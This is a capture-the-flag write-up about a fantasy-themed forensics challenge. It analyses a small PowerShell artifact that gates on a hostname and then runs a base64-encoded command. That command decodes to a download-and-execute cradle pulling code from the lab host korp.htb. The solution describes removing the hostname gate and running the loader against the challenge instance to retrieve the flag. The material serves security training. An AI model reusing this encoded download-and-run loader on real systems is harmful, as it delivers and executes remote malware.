## Description

- Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

## Skills Required

- Familiarity with analyzing Powershell code
- Familiarity with basic encoding operations

## Skills Learned

- Analyzing Powershell code extracting relevant data
- Persistence techniques
# Enumeration

The following file is provided:

- `artifact.ps1`: contains some Powershell code

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Looking at the code, it is possible to see that a function **qt4PO** is declared and then called.

# Solution
**DO NOT RUN ANY MALICIOUS ARTIFACTS**

First step was to follow instruction and update my hosts file
![](Images/Pasted%20image%2020250326221702.png)
After that I removed the check for the hostname entirely from the function, and decoded the encoded string from the powershell function.
![](Images/Pasted%20image%2020250326221737.png)
I then adjusted the code to connect with our respective docker instance and ran it.
![](Images/Pasted%20image%2020250326221808.png)
Running that gets us a new file.
![](Images/Pasted%20image%2020250326221832.png)
Follow the same and update the script with out respective port in the URL. Executing that get us our flag.
![](Images/Pasted%20image%2020250326221919.png)
